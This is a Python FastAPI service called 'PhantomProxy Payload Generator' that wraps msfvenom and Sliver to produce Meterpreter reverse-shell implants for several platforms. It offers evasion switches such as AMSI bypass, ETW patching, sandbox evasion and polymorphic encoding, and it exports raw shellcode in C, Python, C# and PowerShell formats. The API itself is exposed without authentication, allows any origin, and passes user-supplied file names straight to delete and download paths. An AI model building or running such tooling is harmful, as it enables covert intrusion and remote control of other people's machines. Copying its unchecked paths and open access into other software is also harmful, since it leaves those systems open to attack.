"""
PhantomProxy Payload Generator
Wrapper for msfvenom, Sliver, and other payload generators
"""
import os
import subprocess
import uuid
import asyncio
from typing import Dict, List, Optional
from pathlib import Path
from datetime import datetime

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field


# ============================================================================
# Configuration
# ============================================================================

class Settings(BaseModel):
    msfvenom_path: str = "msfvenom"
    output_dir: str = "./payloads"
    temp_dir: str = "./temp"
    default_lhost: str = "0.0.0.0"
    default_lport: int = 4444

    class Config:
        env_file = ".env"


settings = Settings()


# ============================================================================
# Models
# ============================================================================

class PayloadType(str):
    WINDOWS_EXE = "windows_exe"
    WINDOWS_DLL = "windows_dll"
    WINDOWS_PS1 = "powershell"
    WINDOWS_HTA = "hta"
    LINUX_ELF = "linux_elf"
    MACOS = "macos"
    SHELLCODE = "shellcode"
    PYTHON = "python"


class EvasionOptions(BaseModel):
    sleep_obfuscation: bool = False
    sandbox_evasion: bool = False
    amsi_bypass: bool = False
    etw_patch: bool = False
    syscall_usage: bool = False
    encoding: str = "none"  # none, xor, shikata_ga_nai
    encryption: bool = False


class PayloadRequest(BaseModel):
    payload_type: PayloadType
    lhost: str = settings.default_lhost
    lport: int = settings.default_lport
    output_name: Optional[str] = None
    evasion: EvasionOptions = EvasionOptions()
    custom_options: Dict[str, str] = {}


class PayloadResponse(BaseModel):
    success: bool
    payload_id: str
    payload_path: str
    payload_type: str
    size_bytes: int
    checksum: str
    created_at: str
    options: Dict[str, str]


class EncoderInfo(BaseModel):
    name: str
    rank: str  # normal, good, great, excellent
    description: str


# ============================================================================
# FastAPI Application
# ============================================================================

app = FastAPI(
    title="PhantomProxy Payload Generator",
    description="Generate payloads using msfvenom, Sliver, etc.",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ============================================================================
# Helper Functions
# ============================================================================

def get_msfvenom_path() -> str:
    """Find msfvenom in PATH"""
    msfvenom = settings.msfvenom_path

    # Try PATH
    result = subprocess.run(
        ["where" if os.name == "nt" else "which", "msfvenom"],
        capture_output=True,
        text=True
    )

    if result.returncode == 0:
        return "msfvenom"

    return msfvenom


def generate_filename(payload_type: str) -> str:
    """Generate unique filename"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    uid = str(uuid.uuid4())[:8]

    extensions = {
        "windows_exe": ".exe",
        "windows_dll": ".dll",
        "powershell": ".ps1",
        "hta": ".hta",
        "linux_elf": ".elf",
        "macos": ".app",
        "shellcode": ".bin",
        "python": ".py"
    }

    ext = extensions.get(payload_type, ".bin")
    return f"payload_{timestamp}_{uid}{ext}"


def calculate_checksum(filepath: str) -> str:
    """Calculate MD5 checksum"""
    import hashlib

    md5 = hashlib.md5()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5.update(chunk)

    return md5.hexdigest()


# ============================================================================
# Payload Generators
# ============================================================================

def generate_msfvenom_payload(
    payload_type: str,
    lhost: str,
    lport: int,
    output_path: str,
    evasion: EvasionOptions
) -> List[str]:
    """Generate payload using msfvenom"""

    # Map payload type to msfvenom payload name
    payload_map = {
        "windows_exe": "windows/meterpreter/reverse_tcp",
        "windows_dll": "windows/meterpreter/reverse_tcp",
        "powershell": "windows/meterpreter/reverse_tcp",
        "hta": "windows/meterpreter/reverse_hta",
        "linux_elf": "linux/x64/meterpreter/reverse_tcp",
        "macos": "osx/x64/meterpreter/reverse_tcp",
        "shellcode": "windows/meterpreter/reverse_tcp",
        "python": "python/meterpreter/reverse_tcp"
    }

    payload = payload_map.get(payload_type, "windows/meterpreter/reverse_tcp")

    # Build command
    cmd = [
        get_msfvenom_path(),
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", output_path
    ]

    # Add evasion options
    if evasion.amsi_bypass and payload_type == "powershell":
        cmd.extend(["--encoder", "x86/shikata_ga_nai"])

    if evasion.encoding != "none":
        cmd.extend(["-e", evasion.encoding, "-i", "3"])

    return cmd


def generate_sliver_payload(
    payload_type: str,
    lhost: str,
    lport: int,
    output_path: str,
    evasion: EvasionOptions
) -> List[str]:
    """Generate payload using Sliver C2"""
    # Sliver CLI command
    cmd = [
        "sliver-cli",
        "generate",
        "--mtls", f"{lhost}:{lport}",
        "--save", output_path
    ]

    if evasion.sandbox_evasion:
        cmd.append("--sandbox-evasion")

    if evasion.sleep_obfuscation:
        cmd.extend(["--sleep-obfuscation", "true"])

    return cmd


# ============================================================================
# API Endpoints
# ============================================================================

@app.get("/health")
async def health_check():
    """Health check"""
    msfvenom_available = subprocess.run(
        ["where" if os.name == "nt" else "which", "msfvenom"],
        capture_output=True
    ).returncode == 0

    return {
        "status": "healthy",
        "service": "payload-generator",
        "msfvenom_available": msfvenom_available,
        "output_dir": settings.output_dir
    }


@app.get("/encoders")
async def list_encoders():
    """List available encoders"""
    # Mock - in reality would query msfvenom
    return {
        "encoders": [
            {"name": "x86/shikata_ga_nai", "rank": "excellent", "description": "Polymorphic encoder"},
            {"name": "x86/fnstenv_mov", "rank": "good", "description": "Fnstenv mov encoder"},
            {"name": "x64/zutto_dekiru", "rank": "great", "description": "Zutto dekiru encoder"},
            {"name": "cmd/printf_php_xq", "rank": "normal", "description": "Printf PHP encoder"},
        ]
    }


@app.post("/generate", response_model=PayloadResponse)
async def generate_payload(request: PayloadRequest):
    """Generate payload"""

    # Create output directory
    Path(settings.output_dir).mkdir(parents=True, exist_ok=True)

    # Generate filename
    if request.output_name:
        filename = request.output_name
    else:
        filename = generate_filename(request.payload_type)

    output_path = os.path.join(settings.output_dir, filename)

    # Generate payload
    try:
        cmd = generate_msfvenom_payload(
            payload_type=request.payload_type,
            lhost=request.lhost,
            lport=request.lport,
            output_path=output_path,
            evasion=request.evasion
        )

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )

        if result.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Payload generation failed: {result.stderr}"
            )

        # Get file info
        file_size = os.path.getsize(output_path)
        checksum = calculate_checksum(output_path)

        return PayloadResponse(
            success=True,
            payload_id=str(uuid.uuid4()),
            payload_path=output_path,
            payload_type=request.payload_type,
            size_bytes=file_size,
            checksum=checksum,
            created_at=datetime.now().isoformat(),
            options={
                "lhost": request.lhost,
                "lport": str(request.lport),
                "evasion": str(request.evasion.dict()),
            }
        )

    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=500, detail="Payload generation timeout")
    except FileNotFoundError:
        raise HTTPException(
            status_code=500,
            detail="msfvenom not found. Install Metasploit Framework."
        )


@app.post("/generate/shellcode")
async def generate_shellcode(request: PayloadRequest):
    """Generate shellcode with output formats"""

    # Generate raw shellcode
    Path(settings.temp_dir).mkdir(parents=True, exist_ok=True)
    temp_path = os.path.join(settings.temp_dir, f"temp_{uuid.uuid4()}.bin")

    cmd = generate_msfvenom_payload(
        payload_type="shellcode",
        lhost=request.lhost,
        lport=request.lport,
        output_path=temp_path,
        evasion=request.evasion
    )

    result = subprocess.run(cmd, capture_output=True, timeout=60)

    if result.returncode != 0:
        raise HTTPException(status_code=500, detail=result.stderr)

    # Read shellcode
    with open(temp_path, "rb") as f:
        shellcode = f.read()

    # Convert to different formats
    formats = {
        "raw": shellcode.hex(),
        "c": "0x" + ",0x".join(f"{b:02x}" for b in shellcode),
        "python": "\\x" + "\\x".join(f"{b:02x}" for b in shellcode),
        "csharp": ", ".join(f"0x{b:02x}" for b in shellcode),
        "powershell": ",".join(f"0x{b:02x}" for b in shellcode)
    }

    # Cleanup
    os.remove(temp_path)

    return {
        "success": True,
        "shellcode_length": len(shellcode),
        "formats": formats,
        "checksum": calculate_checksum(temp_path) if os.path.exists(temp_path) else "N/A"
    }


@app.get("/payloads")
async def list_payloads():
    """List generated payloads"""
    output_dir = Path(settings.output_dir)

    if not output_dir.exists():
        return {"payloads": []}

    payloads = []
    for file in output_dir.glob("*"):
        if file.is_file():
            payloads.append({
                "name": file.name,
                "size": file.stat().st_size,
                "created": datetime.fromtimestamp(file.stat().st_ctime).isoformat()
            })

    return {"payloads": payloads}


@app.delete("/payload/{filename}")
async def delete_payload(filename: str):
    """Delete payload"""
    filepath = os.path.join(settings.output_dir, filename)

    if not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail="Payload not found")

    os.remove(filepath)

    return {"success": True, "deleted": filename}


@app.get("/payload/{filename}/download")
async def download_payload(filename: str):
    """Download payload"""
    from fastapi.responses import FileResponse

    filepath = os.path.join(settings.output_dir, filename)

    if not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail="Payload not found")

    return FileResponse(
        path=filepath,
        filename=filename,
        media_type="application/octet-stream"
    )


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8082,
        reload=True
    )
